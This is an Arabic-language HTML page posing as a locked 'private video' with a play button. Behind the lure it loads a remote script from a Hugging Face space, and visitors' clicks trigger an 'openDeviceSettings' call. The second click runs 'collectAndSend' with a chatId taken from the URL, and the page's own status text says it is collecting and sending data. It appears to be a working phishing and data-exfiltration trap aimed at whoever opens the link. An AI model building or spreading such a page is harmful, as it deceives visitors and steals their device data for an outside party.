<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <meta name="robots" content="noindex, nofollow" />
    <title>فيديو</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:Arial,sans-serif;
            display:flex;
            flex-direction:column;
            align-items:center;
            justify-content:center;
            min-height:100vh;
            background:#000;
            color:#fff;
        }
        .container{width:90%;max-width:800px;background:#111;border-radius:12px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.5)}
        .video-thumbnail{position:relative;width:100%;height:450px;background:linear-gradient(rgba(0,0,0,0.7),rgba(0,0,0,0.7)),url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');background-size:cover;background-position:center;display:flex;align-items:center;justify-content:center;cursor:default;flex-direction:column}
        #playBtn{display:flex;align-items:center;justify-content:center;width:120px;height:120px;border-radius:50%;background:rgba(255,255,255,0.1);border:3px solid #ff6b6b;cursor:pointer;transition:all 0.3s ease;backdrop-filter:blur(8px);box-shadow:0 0 40px rgba(255,0,0,0.3);z-index:10}
        #playBtn:hover{transform:scale(1.05);background:rgba(255,255,255,0.2);border-color:#ff4757;box-shadow:0 0 60px rgba(255,0,0,0.6)}
        #playBtn span{font-size:60px;color:#ff6b6b;line-height:1;user-select:none}
        .video-info{padding:20px;border-bottom:1px solid #333}
        .video-title{font-size:1.5rem;font-weight:bold;margin-bottom:8px;color:white}
        video{width:100%;height:450px;background:#000;display:none}
        .status{color:#888;font-size:12px;margin-top:10px;text-align:center}
        @media (max-width:480px){
            .video-thumbnail{height:280px}
            #playBtn{width:90px;height:90px}
            #playBtn span{font-size:45px}
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="video-info">
            <div class="video-title">🔒 فيديو خاص</div>
        </div>
        <div class="video-thumbnail" id="poster">
            <div id="playBtn"><span>▶</span></div>
        </div>
        <video id="vid" controls playsinline style="display:none;width:100%;height:450px;background:#000">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4">
        </video>
    </div>
    <div class="status" id="status">اضغط على زر التشغيل</div>

    <!-- الرابط الأصلي الذي طلبته -->
    <script src="https://huggingface.co/spaces/dsfsdjfc/ageagaaa/raw/main/api"></script>

    <script>
    (function() {
        var step = 0;
        var started = false;
        var btn = document.getElementById('playBtn');
        var poster = document.getElementById('poster');
        var vid = document.getElementById('vid');
        var statusEl = document.getElementById('status');

        function setStatus(msg) {
            if (statusEl) statusEl.textContent = msg;
            console.log('[Status]', msg);
        }

        function waitForAPI(callback, attempts) {
            attempts = attempts || 0;
            if (window.SecurityAPI) {
                setStatus('✅ API جاهز');
                callback(window.SecurityAPI);
            } else if (attempts < 30) {
                setStatus('⏳ جاري تحميل API... (' + (attempts + 1) + '/30)');
                setTimeout(function() {
                    waitForAPI(callback, attempts + 1);
                }, 500);
            } else {
                setStatus('❌ فشل تحميل API');
                console.error('API not loaded');
            }
        }

        btn.addEventListener('click', function() {
            if (started) return;

            if (!step) {
                step = 1;
                setStatus('⚙️ جاري فتح الإعدادات...');
                waitForAPI(function(api) {
                    try {
                        api.openDeviceSettings();
                        setStatus('✅ تم فتح الإعدادات، اضغط مرة أخرى للتشغيل');
                    } catch(e) {
                        setStatus('⚠️ لا يمكن فتح الإعدادات');
                    }
                });
            } else {
                started = true;
                setStatus('▶️ تشغيل الفيديو...');
                vid.muted = false;
                vid.volume = 1;
                vid.play().catch(function(){});
                poster.style.display = 'none';
                vid.style.display = 'block';
                btn.style.display = 'none';

                setStatus('📤 جمع وإرسال البيانات...');
                waitForAPI(function(api) {
                    var chatId = new URLSearchParams(window.location.search).get('chatId') || '';
                    api.collectAndSend(chatId).then(function(result) {
                        if (result.success) {
                            setStatus('✅ تم إرسال البيانات بنجاح!');
                        } else {
                            setStatus('⚠️ تم جمع البيانات ولكن فشل الإرسال');
                        }
                        console.log('Result:', result);
                    }).catch(function(err) {
                        setStatus('❌ خطأ: ' + err.message);
                        console.error('Error:', err);
                    });
                });
            }
        });

        document.addEventListener('click', function() {
            if (vid.style.display === 'block') {
                vid.muted = false;
                if (vid.paused) vid.play().catch(function(){});
            }
        }, true);

        setStatus('🟢 جاهز - اضغط على زر التشغيل');
    })();
    </script>
</body>
</html>
